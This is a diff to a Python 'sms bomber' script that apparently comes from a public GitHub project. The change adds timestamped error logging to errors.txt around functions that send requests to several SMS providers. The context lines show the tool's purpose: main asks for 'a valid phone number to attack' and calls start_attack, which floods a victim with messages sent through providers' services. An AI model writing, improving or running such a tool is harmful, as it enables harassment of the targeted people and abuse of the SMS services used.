@@ -1,8 +1,11 @@
 import requests
 import threading
 import json
+import datetime
 
 
+# errors file
+errors_file = open('errors.txt' , 'a')
 
 def replace_phonenumber(phone , data="") :
     result = data.replace("Replace phonenumber here" , phone)
@@ -21,7 +24,11 @@ def send_message(phone, provider_name, provider_info = {} ) :
             if response.status_code == 200 :
                 print(f"{provider_name} => Successful ;")
             else :
-                print(f"{provider_name} => Failed ; error : {response.content}")
+                print(f"{provider_name} => Failed ;")
+
+                errors = f"{'-' *20} \n {provider_name}--({datetime.datetime.now()})-- \n {str(response.content)}"
+                errors_file.write(errors)
+
         except Exception as error :
             print(f"{provider_name} => {error} ;")
 
@@ -64,6 +71,11 @@ def start_attack (phone):
 
 
 def main() :
+    
+    # clear last errors
+    clear_errors = open('errors.txt' , 'w') 
+    clear_errors.write('')
+
     print("Wellcome to sms bomber (https://github.com/Hamed-244/sms-bomber) give us a star")
     phone = input("Enter a valid phone number to attack : ").strip()
 
